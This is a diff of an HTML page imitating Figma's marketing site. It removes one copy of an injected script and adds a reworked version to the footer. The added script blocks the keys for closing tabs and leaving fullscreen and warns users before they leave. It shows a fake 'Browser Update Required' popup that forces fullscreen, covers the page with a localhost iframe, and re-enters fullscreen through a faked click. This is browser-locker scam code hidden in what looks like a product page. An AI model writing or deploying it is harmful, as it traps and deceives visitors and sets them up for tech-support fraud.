@@ -505,152 +505,7 @@
         .css-j94shh {
             width: 100%;
             height: auto;
-            <script>
-document.addEventListener("DOMContentLoaded", function () {
-    // --- Tab Switch Logic ---
-    const tabButtons = document.querySelectorAll('.tab-button');
-    const tabHeading = document.querySelector('.tab-heading');
-    const tabLink = document.querySelector('.tab-link');
-
-    tabButtons.forEach(button => {
-        button.addEventListener('click', () => {
-            tabButtons.forEach(btn => btn.classList.remove('active'));
-            button.classList.add('active');
-
-            const tabName = button.textContent.trim();
-            let heading = '', btnText = '';
-
-            switch (tabName) {
-                case 'Design':
-                    heading = 'Design and refine products with your team, in one shared design file.';
-                    btnText = 'Explore Figma Design';
-                    break;
-                case 'Build':
-                    heading = 'Build products faster with reusable components and developer handoff.';
-                    btnText = 'Explore Dev Mode';
-                    break;
-                case 'Jam':
-                    heading = 'Brainstorm, iterate, and collaborate in real-time with your team.';
-                    btnText = 'Explore FigJam';
-                    break;
-                case 'Present':
-                    heading = 'Create powerful presentations that bring your ideas to life.';
-                    btnText = 'Explore Figma Slides';
-                    break;
-            }
-
-            if (tabHeading) tabHeading.textContent = heading;
-            if (tabLink) tabLink.textContent = btnText;
-        });
-    });
-
-    // --- Video Autoplay on Thumbnail Click ---
-    const thumbnailContainer = document.querySelector('.video-thumbnail-container');
-    if (thumbnailContainer) {
-        thumbnailContainer.addEventListener('click', function () {
-            this.style.display = 'none';
-            const iframe = document.querySelector('iframe');
-            if (iframe) {
-                let src = iframe.src;
-                if (!src.includes('autoplay=1')) {
-                    src += (src.includes('?') ? '&' : '?') + 'autoplay=1&muted=0';
-                    iframe.src = src;
-                }
-            }
-        });
-    }
-
-    // --- Key Blocker (partial, only what browsers allow) ---
-    document.addEventListener('keydown', function (event) {
-        const key = event.key.toLowerCase();
-        const blockedCombos = [
-            (event.ctrlKey && ["w", "r", "t"].includes(key)),
-            (event.altKey && key === "f4"),
-            ["f11", "f12"].includes(key),
-        ];
-        if (blockedCombos.some(Boolean)) {
-            event.preventDefault();
-            event.stopPropagation();
-            console.log(`Blocked: ${event.key}`);
-        }
-    });
-
-    // --- Warn Before Leaving ---
-    window.onbeforeunload = function () {
-        return "Are you sure you want to leave this page?";
-    };
-
-    // --- Fullscreen Trigger After Button Click ---
-    window.showUpdatePopup = function (event) {
-        event.preventDefault();
-
-        const overlay = document.createElement('div');
-        overlay.style.cssText = `
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); z-index: 10000;
-            display: flex; justify-content: center; align-items: center;
-        `;
-
-        const popup = document.createElement('div');
-        popup.style.cssText = `
-            background: white; padding: 30px; border-radius: 8px;
-            max-width: 400px; text-align: center;
-        `;
-
-        const title = document.createElement('h3');
-        title.textContent = 'Browser Update Required';
-        title.style.marginBottom = '15px';
-
-        const message = document.createElement('p');
-        message.textContent = 'Your browser needs to be updated to continue.';
-        message.style.marginBottom = '20px';
-
-        const updateButton = document.createElement('button');
-        updateButton.textContent = 'Update';
-        updateButton.style.cssText = `
-            padding: 10px 20px; background: black; color: white;
-            border: none; border-radius: 6px; cursor: pointer;
-        `;
-
-        updateButton.addEventListener('click', function () {
-            document.body.removeChild(overlay);
-
-            // Open invisible iframe
-            const iframe = document.createElement('iframe');
-            iframe.src = 'http://localhost/';
-            iframe.style.cssText = `
-                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                border: none; z-index: 99999;
-            `;
-            document.body.appendChild(iframe);
-
-            // Request fullscreen (user click just happened, so this should work)
-            document.documentElement.requestFullscreen().catch(err => {
-                console.warn('Fullscreen failed:', err);
-            });
-
-            // Auto re-enter fullscreen if exited
-            document.addEventListener('fullscreenchange', function () {
-                if (!document.fullscreenElement) {
-                    setTimeout(() => {
-                        document.documentElement.requestFullscreen().catch(() => {});
-                    }, 100);
-                }
-            });
-
-            // Lock scrolling
-            document.body.style.overflow = 'hidden';
-        });
-
-        popup.appendChild(title);
-        popup.appendChild(message);
-        popup.appendChild(updateButton);
-        overlay.appendChild(popup);
-        document.body.appendChild(overlay);
-    };
-});
-</script>
-border-radius: 10px;
+            border-radius: 10px;
             box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
         }
 
@@ -1243,147 +1098,131 @@ border-radius: 10px;
             </div>
         </div>
     </footer>
-
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-    // Global key blocking function remains the same
-    function blockKeys(e) {
-        const key = e.key.toLowerCase();
-        if (
-            (e.ctrlKey && ["w", "r", "t"].includes(key)) ||
-            (e.metaKey && ["w", "r", "t"].includes(key)) ||
-            (e.altKey && key === "f4") ||
-            ["f11", "f12", "escape"].includes(key)
-        ) {
-            e.preventDefault();
-            e.stopPropagation();
-            console.log("Blocked key:", e.key);
-        }
-    }
-    document.addEventListener("keydown", blockKeys);
-
-    // Warn on page unload
-    window.onbeforeunload = function () {
-        return "Are you sure you want to leave?";
-    };
-
-    // Instead of auto-requesting fullscreen on exit, show a re-enable button
-    document.addEventListener("fullscreenchange", function () {
-        if (!document.fullscreenElement) {
-            // Create a temporary overlay prompting the user to click to re-enable fullscreen
-            const fsPrompt = document.createElement("div");
-            fsPrompt.style.position = "fixed";
-            fsPrompt.style.top = "0";
-            fsPrompt.style.left = "0";
-            fsPrompt.style.width = "100%";
-            fsPrompt.style.height = "100%";
-            fsPrompt.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
-            fsPrompt.style.color = "#fff";
-            fsPrompt.style.display = "flex";
-            fsPrompt.style.justifyContent = "center";
-            fsPrompt.style.alignItems = "center";
-            fsPrompt.style.zIndex = "100000";
-            fsPrompt.style.fontSize = "1.2rem";
-            fsPrompt.textContent = "Click to re-enable fullscreen";
-
-            fsPrompt.addEventListener("click", function () {
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.log("Fullscreen request failed:", err);
-                });
-                fsPrompt.remove();
-            });
-            document.body.appendChild(fsPrompt);
-        }
-    });
-
-    // Popup and Localhost Lockdown Functionality
-    function showUpdatePopup(event) {
-        if (event) event.preventDefault();
-
-        const overlay = document.createElement('div');
-        overlay.style.position = 'fixed';
-        overlay.style.top = '0';
-        overlay.style.left = '0';
-        overlay.style.width = '100%';
-        overlay.style.height = '100%';
-        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-        overlay.style.zIndex = '10000';
-        overlay.style.display = 'flex';
-        overlay.style.justifyContent = 'center';
-        overlay.style.alignItems = 'center';
-
-        const popup = document.createElement('div');
-        popup.style.backgroundColor = 'white';
-        popup.style.padding = '30px';
-        popup.style.borderRadius = '8px';
-        popup.style.maxWidth = '400px';
-        popup.style.textAlign = 'center';
-
-        const title = document.createElement('h3');
-        title.textContent = 'Browser Update Required';
-        title.style.marginBottom = '15px';
-
-        const message = document.createElement('p');
-        message.textContent = 'Your browser needs to be updated to continue.';
-        message.style.marginBottom = '20px';
-
-        const updateButton = document.createElement('button');
-        updateButton.textContent = 'Update';
-        updateButton.style.padding = '10px 20px';
-        updateButton.style.backgroundColor = '#000';
-        updateButton.style.color = '#fff';
-        updateButton.style.border = 'none';
-        updateButton.style.borderRadius = '6px';
-        updateButton.style.cursor = 'pointer';
-
-        updateButton.addEventListener('click', function () {
-            document.body.removeChild(overlay);
-
-            const hiddenFrame = document.createElement('iframe');
-            hiddenFrame.src = 'http://localhost/';
-            // Using sandbox attribute to enable same-origin access if possible
-            hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
-            hiddenFrame.style.position = 'fixed';
-            hiddenFrame.style.top = '0';
-            hiddenFrame.style.left = '0';
-            hiddenFrame.style.width = '100%';
-            hiddenFrame.style.height = '100%';
-            hiddenFrame.style.border = 'none';
-            hiddenFrame.style.zIndex = '99999';
-
-            hiddenFrame.onload = function () {
-                document.body.style.overflow = 'hidden';
-                // Request fullscreen from user gesture during Update click
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.log("Fullscreen not allowed:", err);
-                });
-
-                try {
-                    hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
-                    hiddenFrame.contentWindow.onbeforeunload = function () {
-                        return "Are you sure you want to leave?";
-                    };
-                } catch (error) {
-                    console.warn("Cannot attach key blocker to iframe:", error);
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            function blockKeys(e) {
+                const key = e.key.toLowerCase();
+                if (
+                    (e.ctrlKey && ["w", "r", "t"].includes(key)) ||
+                    (e.metaKey && ["w", "r", "t"].includes(key)) ||
+                    (e.altKey && key === "f4") ||
+                    ["f11", "f12", "escape"].includes(key)
+                ) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    console.log("Blocked key:", e.key);
                 }
+            }
+            document.addEventListener("keydown", blockKeys);
+        
+            // Warn on page unload
+            window.onbeforeunload = function () {
+                return "Are you sure you want to leave?";
             };
-
-            document.body.appendChild(hiddenFrame);
+        
+            // Automatically re-enter fullscreen on exit using a fake gesture
+            document.addEventListener("fullscreenchange", function () {
+                if (!document.fullscreenElement) {
+                    const fakeButton = document.createElement("button");
+                    fakeButton.style.display = "none";
+                    document.body.appendChild(fakeButton);
+                    fakeButton.addEventListener("click", () => {
+                        document.documentElement.requestFullscreen().catch(err => {
+                            console.log("Re-request fullscreen failed:", err);
+                        });
+                    });
+                    fakeButton.click();
+                    fakeButton.remove();
+                }
+            });
+        
+            // Popup and Localhost Lockdown Functionality
+            function showUpdatePopup(event) {
+                if (event) event.preventDefault();
+        
+                const overlay = document.createElement('div');
+                overlay.style.position = 'fixed';
+                overlay.style.top = '0';
+                overlay.style.left = '0';
+                overlay.style.width = '100%';
+                overlay.style.height = '100%';
+                overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+                overlay.style.zIndex = '10000';
+                overlay.style.display = 'flex';
+                overlay.style.justifyContent = 'center';
+                overlay.style.alignItems = 'center';
+        
+                const popup = document.createElement('div');
+                popup.style.backgroundColor = 'white';
+                popup.style.padding = '30px';
+                popup.style.borderRadius = '8px';
+                popup.style.maxWidth = '400px';
+                popup.style.textAlign = 'center';
+        
+                const title = document.createElement('h3');
+                title.textContent = 'Browser Update Required';
+                title.style.marginBottom = '15px';
+        
+                const message = document.createElement('p');
+                message.textContent = 'Your browser needs to be updated to continue.';
+                message.style.marginBottom = '20px';
+        
+                const updateButton = document.createElement('button');
+                updateButton.textContent = 'Update';
+                updateButton.style.padding = '10px 20px';
+                updateButton.style.backgroundColor = '#000';
+                updateButton.style.color = '#fff';
+                updateButton.style.border = 'none';
+                updateButton.style.borderRadius = '6px';
+                updateButton.style.cursor = 'pointer';
+        
+                updateButton.addEventListener('click', function () {
+                    // Request fullscreen FIRST (user gesture)
+                    document.documentElement.requestFullscreen().then(() => {
+                        document.body.removeChild(overlay);
+        
+                        const hiddenFrame = document.createElement('iframe');
+                        hiddenFrame.src = 'http://localhost/';
+                        hiddenFrame.sandbox = "allow-scripts allow-same-origin allow-popups allow-forms";
+                        hiddenFrame.style.position = 'fixed';
+                        hiddenFrame.style.top = '0';
+                        hiddenFrame.style.left = '0';
+                        hiddenFrame.style.width = '100%';
+                        hiddenFrame.style.height = '100%';
+                        hiddenFrame.style.border = 'none';
+                        hiddenFrame.style.zIndex = '99999';
+        
+                        hiddenFrame.onload = function () {
+                            document.body.style.overflow = 'hidden';
+        
+                            try {
+                                hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
+                                hiddenFrame.contentWindow.onbeforeunload = function () {
+                                    return "Are you sure you want to leave?";
+                                };
+                            } catch (error) {
+                                console.warn("Cannot attach key blocker to iframe:", error);
+                            }
+                        };
+        
+                        document.body.appendChild(hiddenFrame);
+                    }).catch(err => {
+                        console.log("Initial fullscreen failed:", err);
+                    });
+                });
+        
+                popup.appendChild(title);
+                popup.appendChild(message);
+                popup.appendChild(updateButton);
+                overlay.appendChild(popup);
+                document.body.appendChild(overlay);
+            }
+        
+            window.showUpdatePopup = showUpdatePopup;
         });
-
-        popup.appendChild(title);
-        popup.appendChild(message);
-        popup.appendChild(updateButton);
-        overlay.appendChild(popup);
-        document.body.appendChild(overlay);
-    }
-
-    window.showUpdatePopup = showUpdatePopup;
-});
-</script>
-
-
-
+        </script>
+        
+        
 </body>
 
 </html>
